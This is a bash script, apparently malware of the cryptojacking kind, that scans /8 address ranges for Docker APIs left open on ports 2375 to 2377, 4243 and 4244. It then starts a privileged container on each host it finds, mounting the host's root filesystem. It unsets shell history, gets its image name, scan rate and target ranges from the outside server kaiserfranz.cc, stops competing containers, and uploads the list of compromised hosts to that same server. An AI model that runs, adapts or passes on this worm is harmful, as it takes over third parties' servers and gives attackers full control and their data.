#!/bin/bash
unset HISTFILE
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games

function DOCKERGEDDON(){
THERANGE=$1
PORT=$2
SCANRATE=$3
PWNCONTI=$4
rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
eval "$rndstr"="'$(masscan $THERANGE -p$PORT --rate=$SCANRATE | awk '{print $6}'| zgrab --senders 200 --port $PORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";

for IPADDY in ${!rndstr}
do
echo "$IPADDY:$PORT"
echo "$IPADDY:$PORT" >> /tmp/out.txt
timeout -s SIGKILL 30 docker -H $IPADDY:$PORT info  >> /tmp/check.txt 2>/dev/null
HE_SAY=$?
echo $HE_SAY
if [ "$HE_SAY" = "0" ]; then
DONTINF="no"
RAM=$(cat /tmp/check.txt | grep "Total Memory" | awk '{print $3}')
ARCHITEC=$(cat /tmp/check.txt | grep Architecture | awk '{print $2}')
if [ "$RAM" = "31.42GiB" ]; then DONTINF="yes" ; echo -e "\e[1;33;41m Ein freundliches FU!!! \033[0m"; fi
if [ "$ARCHITEC" != "x86_64" ] ; then DONTINF="yes" ; echo -e "\e[1;33;41m Noch nicht unsere Plattform!!! \033[0m"; fi
if [ "$DONTINF" = "no" ]; then
timeout -s SIGKILL 120 docker -H $IPADDY:$PORT run -d --name smallV2 --privileged --net host -v /:/host $PWNCONTI
HE_SAY=$?
echo $HE_SAY
if [ "$HE_SAY" = "0" ]; then
OLDCONTI=`docker -H $IPADDY:$PORT ps | grep -v "smallV2" | grep "small" | awk '{print $1}'`
if ! [ -z "$OLDCONTI" ] ; then docker -H $IPADDY:$PORT stop $OLDCONTI ; fi
fi

fi ; fi
rm -f /tmp/check.txt
done;
}

while true
do
CONTAINER=$(curl -s http://kaiserfranz.cc/SFRAME/data/cont_docker.dat)
if [ -z "$CONTAINER" ] ; then CONTAINER="zyx1475/small" ; fi
SRATE=$(curl -s http://kaiserfranz.cc/SFRAME/range/d_rate.txt)
if [ -z "$SRATE" ] ; then SRATE="100000" ; fi
RANGE=$(curl -s http://kaiserfranz.cc/SFRAME/range/d.php)
RANGETOSCAN=$RANGE".0.0.0/8"
if [ -z "$RANGETOSCAN" ] ; then RANGETOSCAN=$(($RANDOM%255+1)).0.0.0/8 ; fi
DOCKERGEDDON $RANGETOSCAN 2375 $SRATE $CONTAINER
if [ -f "/tmp/out.txt" ] ; then curl -F "userfile=@/tmp/out.txt" http://kaiserfranz.cc/SFRAME/results/d.php ; rm -f /tmp/out.txt ; fi
DOCKERGEDDON $RANGETOSCAN 2376 $SRATE $CONTAINER
if [ -f "/tmp/out.txt" ] ; then curl -F "userfile=@/tmp/out.txt" http://kaiserfranz.cc/SFRAME/results/d.php ; rm -f /tmp/out.txt ; fi
DOCKERGEDDON $RANGETOSCAN 2377 $SRATE $CONTAINER
if [ -f "/tmp/out.txt" ] ; then curl -F "userfile=@/tmp/out.txt" http://kaiserfranz.cc/SFRAME/results/d.php ; rm -f /tmp/out.txt ; fi
DOCKERGEDDON $RANGETOSCAN 4244 $SRATE $CONTAINER
if [ -f "/tmp/out.txt" ] ; then curl -F "userfile=@/tmp/out.txt" http://kaiserfranz.cc/SFRAME/results/d.php ; rm -f /tmp/out.txt ; fi
DOCKERGEDDON $RANGETOSCAN 4243 $SRATE $CONTAINER
if [ -f "/tmp/out.txt" ] ; then curl -F "userfile=@/tmp/out.txt" http://kaiserfranz.cc/SFRAME/results/d.php ; rm -f /tmp/out.txt ; fi
done
